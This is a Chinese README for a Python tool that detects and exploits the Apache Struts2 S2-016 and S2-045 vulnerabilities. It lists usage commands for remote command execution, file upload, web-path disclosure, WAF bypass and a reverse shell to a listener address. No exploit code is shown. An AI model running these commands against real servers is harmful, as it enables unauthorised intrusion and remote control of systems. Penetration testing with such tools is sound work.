# Struts2-tool

此工具用于检测和利用Struts2框架漏洞，目前支持S2-016（适用于Struts 2.0.0 - Struts 2.3.15）和S2-045（适用于Struts 2.3.5 – Struts 2.3.31和 Struts 2.5 – Struts 2.5.10）。这两个漏洞基本上就可以覆盖市面上所有较老的Struts版本了。

本工具在https://github.com/HatBoy/Struts2-Scan项目的基础上进行了改进，消除了bug，增加了一些功能。在此向原工具作者表示感谢。

该工具仅限安全从业者在法律法规允许的范围内使用，违规使用后果自负。 

## 运行环境

Python3.6.X及其以上版本

第三方库: click, requests, bs4

## 支持功能

1，单个url，多个url批量漏洞检测

2，返回网站物理路径

3，基本命令执行功能

4，文件上传功能 （目标为Struts 2.5.x时不支持）

5，反弹shell功能

6，支持携带cookie发包

7，支持配置http/https代理

8，支持过waf，已在一些waf环境下测试过。

工具对windows和Linux靶机，Struts 2.3.x和Struts 2.5.x版本均经过测试，除括号标出的特殊情况外，其他情况均可放心使用，在输入命令以及参数的时候注意对特殊字符加转义。

## 使用说明

1，显示使用帮助：

​      python3 struts2_tool.py -h 

2，单个url检测：

​      python3 struts2_tool.py -u \<要检测的url\>

3，多个url检测:  

​      python3 struts2_tool.py -f \<url文件的物理路径\>

4，返回网站物理路径:  

​      python3 struts2_tool.py -u \<要检测的url\> -n \<S2-016\|S2-045\> --webpath

5，命令执行（目标是windows需要设置GBK编码）:           

​      python3 struts2_tool.py -u \<要检测的url\> -n \<S2-016\|S2-045\> -e \[-c GBK\]

6，上传文件:           

​      python3 struts2_tool.py -u \<要检测的url\> -n \<S2-016\|S2-045\> --upfile \<待上传文件的物理路径\> --uppath \<上传目标物理路径\>

7，反弹shell:          

​      python3 struts2_tool.py -u \<要检测的url\> -n \<S2-016\|S2-045\> -r \<监听IP:监听端口\>



